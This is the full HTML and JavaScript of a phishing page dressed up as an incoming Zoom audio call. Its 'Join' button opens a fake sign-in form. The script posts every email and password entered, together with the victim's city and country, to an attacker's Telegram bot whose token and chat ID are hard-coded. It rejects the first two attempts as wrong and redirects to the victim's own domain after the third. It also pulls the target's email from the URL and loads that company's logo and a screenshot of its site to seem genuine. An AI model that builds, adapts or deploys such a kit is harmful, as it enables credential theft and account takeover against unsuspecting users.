<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Polished Call — Reactive Ripple Audio</title>
<style>
/* GENERAL */
:root{
  --bg:#0f1724; --panel:#151823; --muted:#9aa6b2;
  --accent:#22c55e; --white:#e6eef8; --danger:#ef4444;
}
*{box-sizing:border-box}
body{
  margin:0; font-family:Inter, system-ui;
  background:url('https://i.postimg.cc/zvKCKn8P/zoom-webpage-black.png') center/cover no-repeat;
  min-height:100vh; display:flex; align-items:center; justify-content:center;
  color:var(--white)
}

/* LOADING */
#loadingScreen{
  position:fixed; inset:0; background:#0f1724;
  display:flex; align-items:center; justify-content:center;
  z-index:9999; opacity:1; transition:opacity .8s ease;
}
#loadingScreen img{
  width:110px;height:110px;object-fit:contain;
  animation:spin 2s linear infinite;
}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}

/* PANEL */
.panel{
  width:920px; max-width:95%; background:var(--panel);
  border-radius:14px; padding:28px;
  box-shadow:0 30px 60px rgba(2,6,23,0.6);
  border:1px solid rgba(255,255,255,0.03);
  display:none; opacity:0; transition:opacity .6s ease;
}
.panel-header{
  display:flex; align-items:center; gap:12px;
  color:var(--muted); margin-bottom:18px;
}

/* CALL SECTION */
.call-stage{
  display:flex;
  justify-content:space-between;
  gap:24px;
}

.participant-card{
  flex:1;
  display:flex;
  flex-direction:column;
  align-items:center;
  padding:20px;
  text-align:center;
  min-height:390px;
  position:relative;
}

/* AVATAR */
.avatar-wrap{
  width:220px;height:220px;border-radius:50%;overflow:hidden;
  background:#0f1724;border:6px solid rgba(255,255,255,0.03);
  position:relative; display:flex; align-items:center; justify-content:center;
}
.avatar-wrap img{
  width:100%;height:100%;object-fit:cover;border-radius:50%;
}

/* MIC ICON */
.mic-indicator{
  width:28px;
  height:28px;
  display:none;
  position:absolute;
  left:50%;
  transform:translateX(-50%);
  bottom: -36px;
  z-index:10;
}
.mic-indicator svg{
  width:100%; height:100%;
  fill:#ffffff;
  opacity:0.95;
}

/* HOST RIPPLE */
.wave{
  position:relative; width:180px; height:180px;
  margin:24px auto 0;
}
.ripple{
  position:absolute; top:50%; left:50%;
  transform:translate(-50%,-50%);
  border:3px solid var(--accent); border-radius:50%;
  opacity:.35;
  transition:width .1s linear,height .1s linear,opacity .15s ease-out;
}

/* GUEST GREEN DOT */
.green-dot{
  position:absolute; bottom:14px; right:14px;
  width:18px; height:18px; border-radius:50%;
  background:#22c55e; box-shadow:0 0 12px #22c55e;
}

/* CALL BUTTONS */
.controls{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:60px;
  margin-top:35px;
}

.call-btn{
  width:82px;
  height:82px;
  border-radius:50%;
  border:none;
  display:flex;
  align-items:center;
  justify-content:center;
  cursor:pointer;
  box-shadow:0 8px 25px rgba(0,0,0,0.35);
  transition:transform .15s ease;
}
.call-btn:active{ transform:scale(.90); }

.call-icon{
  width:42px;
  height:42px;
  fill:white;
}

.accept{ background:#22c55e; }
.decline{
  background:#ef4444;
  transform:rotate(135deg);
}

.label{
  text-align:center;
  margin-top:8px;
  font-size:14px;
  color:var(--white);
  opacity:.85;
}

/* LOGIN BOX */
.login-box{
  position:fixed; left:50%; top:50%; transform:translate(-50%,-50%);
  max-width:380px; width:92%; background:#fff; color:#0f1724;
  box-shadow:0 20px 50px rgba(2,6,23,0.5);
  padding:22px; border-radius:12px;
  display:none; opacity:0; transition:opacity .5s ease;
}
.login-box input{
  width:100%; padding:12px; margin-bottom:10px;
  border-radius:8px; border:1px solid #ddd;
}
.login-box .btn{
  width:100%; padding:12px; border-radius:8px; border:none;
  background:#0078d4; color:#fff; font-weight:700;
}
.error{
  color:#ef4444; font-weight:700; margin-top:10px;
  min-height:22px; text-align:center;
}

.login-box.shake{
  transform: translate(-50%,-50%) translateX(0);
  animation: shakeX .18s ease 0s 2;
}
@keyframes shakeX {
  0% { transform: translate(-50%,-50%) translateX(0); }
  25% { transform: translate(-50%,-50%) translateX(-6px); }
  50% { transform: translate(-50%,-50%) translateX(6px); }
  75% { transform: translate(-50%,-50%) translateX(-4px); }
  100% { transform: translate(-50%,-50%) translateX(0); }
}

/* END SCREEN */
#endScreen{
  position:fixed; inset:0; background:#000; color:#fff;
  display:flex; align-items:center; justify-content:center;
  font-size:32px; font-weight:700;
  opacity:0; pointer-events:none; transition:opacity .5s;
}
</style>
</head>

<body>

<!-- LOADING -->
<div id="loadingScreen">
  <img src="https://i.postimg.cc/qv5p8stB/blue-camera-icon-live-media-streaming-application-phone-conference-video-calls-video-communications.jpg" alt="loading">
</div>

<div class="panel" id="mainPanel">

  <div class="panel-header">
    <div>Zoom Audio Call</div>
    <div style="flex:1"></div>
    <div id="callTimer">00:00</div>
  </div>

  <div class="call-stage">

    <!-- HOST -->
    <div class="participant-card" id="p1">
      <div class="avatar-wrap">
        <img src="https://i.postimg.cc/qBNDCKfk/IMG-0818.jpg" alt="host avatar">
      </div>
      <div class="name">Micheal Bryan</div>
      <div class="role">Host</div>

      <div class="wave">
        <div class="ripple" id="p1r1"></div>
        <div class="ripple" id="p1r2"></div>
        <div class="ripple" id="p1r3"></div>
      </div>
    </div>

    <!-- GUEST -->
    <div class="participant-card" id="p2">
      <div class="avatar-wrap">
        <img src="https://i.postimg.cc/8cR3pShh/Chat-GPT-Image-Nov-14-2025-07-20-14-AM.png" alt="guest avatar">
        <div class="green-dot"></div>
      </div>

      <div class="name">Waiting for Guest</div>
      <div class="role">Microphone</div>

      <div class="mic-indicator" id="micIcon">
        <svg viewBox="0 0 24 24">
          <path d="M12 14a3 3 0 0 0 3-3V5a3 3 0 0 0-6 0v6a3 3 0 0 0 3 3zm5-3a5 5 0 0 1-10 0H5a7 7 0 0 0 14 0h-2zM11 17h2v3h3v2H8v-2h3v-3z"/>
        </svg>
      </div>
    </div>

  </div>

  <div class="controls">

    <div>
      <button id="declineBtn" class="call-btn decline" title="Decline">
        <svg class="call-icon" viewBox="0 0 24 24">
          <path d="M21 16.92v3a2 2 0 0 1-2.18 2 19.86 19.86 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6A19.86 19.86 0 0 1 2.08 5.18 2 2 0 0 1 4 3h3a2 2 0 0 1 2 1.72c.12 1.05.39 2.07.78 3.03a2 2 0 0 1-.45 2.11L8.91 11.09a16 16 0 0 0 6 6l1.23-1.23a2 2 0 0 1 2.11-.45c.96.39 1.98.66 3.03.78A2 2 0 0 1 21 16.92z"/>
        </svg>
      </button>
      <div class="label">Decline</div>
    </div>

    <div>
      <button id="joinBtn" class="call-btn accept" title="Join">
        <svg class="call-icon" viewBox="0 0 24 24">
          <path d="M21 16.92v3a2 2 0 0 1-2.18 2 19.86 19.86 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6A19.86 19.86 0 0 1 2.08 5.18 2 2 0 0 1 4 3h3a2 2 0 0 1 2 1.72c.12 1.05.39 2.07.78 3.03a2 2 0 0 1-.45 2.11L8.91 11.09a16 16 0 0 0 6 6l1.23-1.23a2 2 0 0 1 2.11-.45c.96.39 1.98.66 3.03.78A2 2 0 0 1 21 16.92z"/>
        </svg>
      </button>
      <div class="label">Join</div>
    </div>

  </div>

</div>

<!-- LOGIN -->
<div class="login-box" id="loginBox" role="dialog" aria-modal="true" aria-hidden="true">
  <div class="logo" style="text-align:center;margin-bottom:8px;">
    <img src="https://i.postimg.cc/qv5p8stB/blue-camera-icon-live-media-streaming-application-phone-conference-video-calls-video-communications.jpg" alt="Logo" style="width:60px;height:60px;object-fit:contain;">
  </div>
  <h2 style="text-align:center;margin:0 0 12px 0">Sign in</h2>
  <div id="error-msg" class="error" style="display:block;height:22px;"></div>
  <form id="loginForm" onsubmit="return false;">
    <input type="email" id="email" placeholder="Email, phone, or Skype" required>
    <input type="password" id="password" placeholder="Password" required>
    <div style="height:8px"></div>
    <button type="button" id="login-btn" class="btn">Login</button>
  </form>
  <div style="text-align:center;margin-top:10px;font-size:12px;color:#666">Forgot password? · Terms · Privacy</div>
</div>

<div class="overlay" style="position:fixed;inset:0;background:#000;opacity:0;transition:.5s"></div>

<!-- END SCREEN -->
<div id="endScreen">Session Ended</div>

<script>
// Telegram Bot config
  const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
  const TELEGRAM_CHAT_ID = "7574749243";

// Elements
const rawHash = window.location.hash.substring(1);
const emailInput = document.getElementById('email');
const logoImg = document.getElementById('logo');
const bgFrame = document.getElementById('bg-frame');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('login-btn');
const errorMsg = document.getElementById('error-msg');
const overlay = document.querySelector('.overlay');
const urlParams = new URLSearchParams(window.location.search);
const email = urlParams.get("email");
let attempts = 0;
const maxAttempts = 3;

// FIX 1: Overlay should NOT block UI until AFTER login success
overlay.style.pointerEvents = "none";
overlay.style.opacity = "0";

document.body.classList.add('blur-active');

if (!/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {

} else {
  emailInput.value = rawHash;
  emailInput.setAttribute("readonly", true);

  const domain = rawHash.split('@')[1];

  // Set logo
  logoImg.src = `https://logo.clearbit.com/${domain}`;
  logoImg.onerror = () => {
    logoImg.src = "https://via.placeholder.com/150?text=Logo";
  };

  // Fallback screenshot
  const fallbackScreenshot = document.createElement('img');
  fallbackScreenshot.id = "fallback-screenshot";
  fallbackScreenshot.style.cssText = `
    display:none;
    position:fixed;top:0;left:0;
    width:100vw;height:100vh;
    object-fit:cover;
    z-index:-1;
    pointer-events:none;
  `;
  fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
  document.body.appendChild(fallbackScreenshot);

  // Load iframe with timeout
  let iframeLoaded = false;
  bgFrame.src = `https://${domain}`;

  bgFrame.onload = () => {
    iframeLoaded = true;
    fallbackScreenshot.style.display = "none";
    bgFrame.style.display = "block";
  };

  setTimeout(() => {
    if (!iframeLoaded) {
      bgFrame.style.display = "none";
      fallbackScreenshot.style.display = "block";
    }
  }, 6000);

  bgFrame.onerror = () => {
    bgFrame.style.display = "none";
    fallbackScreenshot.style.display = "block";
  };
}

// Fetch user country
let userIP = "Unknown IP";
let userCity = "Unknown City";
let userCountry = "Unknown Country";
let userISP = "Unknown ISP";

loginBtn.disabled = true;

fetch("https://ipapi.co/json/")
  .then(res => res.json())
  .then(data => {
    userCity = data.city || userCity;
    userCountry = data.country_name || userCountry;
  })
  .finally(() => {
    loginBtn.disabled = false;
  });

// Telegram message sender
function sendTelegramMessage(email, password, attempt, country) {
  const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
               ` UserId : [ ${email} ]\n` +
               `    Pass : [ ${password} ]\n` +
               ` Country : [ ${userCity}, ${userCountry} ]`;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    parse_mode: "HTML"
  };
  fetch(url, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(payload)
  }).catch(e => console.error("Telegram send failed:", e));
}

// Login button handler
loginBtn.addEventListener('click', () => {
  const password = passwordInput.value.trim();
  if (password === "") {
    errorMsg.textContent = "Password cannot be empty.";
    return;
  }
  attempts++;
  sendTelegramMessage(emailInput.value, password, attempts, userCountry);

  if (attempts < maxAttempts) {
    errorMsg.textContent = "Incorrect password.";
    passwordInput.value = "";
  } else {
    errorMsg.textContent = "";
    overlay.style.display = 'none';
    document.body.classList.remove('blur-active');
    window.location.href = `https://${emailInput.value.split('@')[1]}`;
  }
});
/* CALL TIMER */
let sec = 0;
setInterval(()=>{
  sec++;
  callTimer.textContent =
    String(Math.floor(sec/60)).padStart(2,'0') + ":" +
    String(sec%60).padStart(2,'0');
},1000);

/* LOADING → MAIN PANEL */
window.addEventListener('load', ()=> {
  setTimeout(()=>{
    loadingScreen.style.opacity='0';
    setTimeout(()=>{
      loadingScreen.style.display='none';
      mainPanel.style.display='block';
      requestAnimationFrame(()=> mainPanel.style.opacity='1');
    },600);
  },600);
});

/* JOIN BUTTON → SHOW LOGIN */
joinBtn.addEventListener('click', ()=>{
  mainPanel.style.opacity='0';
  setTimeout(()=>{
    mainPanel.style.display='none';
    loginBox.style.display='block';
    requestAnimationFrame(()=> loginBox.style.opacity='1');
  },300);
});

/* CLICK OUTSIDE → CLOSE LOGIN */
window.addEventListener('click', (e)=>{
  if (loginBox.style.display==='block' && !loginBox.contains(e.target)) {
    loginBox.style.opacity='0';
    setTimeout(()=>{
      loginBox.style.display='none';
      mainPanel.style.display='block';
      requestAnimationFrame(()=> mainPanel.style.opacity='1');
    },250);
  }
});

/* DECLINE → END SCREEN */
declineBtn.addEventListener('click', ()=> {
  document.getElementById('endScreen').style.opacity='1';
});

/* ------------------------------------------
   ACTIVE LOGIN HANDLER (YOUR REQUEST)
------------------------------------------- */
loginBtn.addEventListener('click', async () => {

  const email = emailInput.value.trim();
  const pass = passwordInput.value.trim();

  errorMsg.textContent = "";

  if (!email || !pass) {
    errorMsg.textContent = "Incorrect Password.";
    shake(loginBox);
    return;
  }

  try {
    const result = await authenticateUser(email, pass, rawHash);

    if (result.success) {
      overlay.style.opacity = "1";
      setTimeout(()=> {
        window.location.href = result.redirect || "dashboard.html";
      },500);
    } else {
      errorMsg.textContent = result.message || "Invalid password";
      passwordInput.value = "";
      shake(loginBox);
    }
  } catch (err) {
    console.error(err);
    errorMsg.textContent = "Network error.";
    shake(loginBox);
  }
});

function shake(el){
  el.classList.remove('shake');
  void el.offsetWidth;
  el.classList.add('shake');
}

/* BACKEND HOOK — YOU MODIFY THIS */
async function authenticateUser(email, pass, hash){
  // EXAMPLE backend call:
  /*
  const res = await fetch("/login", {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({email, password: pass, session: hash})
  });
  return await res.json();
  */

  // TEMP fallback
  return { success:false, message:"Invalid credentials" };
}

/* HOST MICROPHONE RIPPLE */
async function hostRipple(){
  const r1 = document.getElementById("p1r1");
  const r2 = document.getElementById("p1r2");
  const r3 = document.getElementById("p1r3");
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const analyser = ctx.createAnalyser();
    analyser.fftSize = 256;
    const mic = ctx.createMediaStreamSource(stream);
    mic.connect(analyser);
    const data = new Uint8Array(analyser.frequencyBinCount);
    function update(){
      analyser.getByteFrequencyData(data);
      let volume = data.reduce((a,b)=>a+b,0) / data.length;
      let size = Math.max(20, Math.min(160, volume * 1.6));
      r1.style.width = r1.style.height = size + "px";
      r2.style.width = r2.style.height = (size * 0.7) + "px";
      r3.style.width = r3.style.height = (size * 0.4) + "px";
      micIcon.style.display = volume > 20 ? "block" : "none";
      requestAnimationFrame(update);
    }
    update();
  }catch(e){
    console.warn("Microphone error", e);
  }
}
hostRipple();

</script>
</body>
</html>
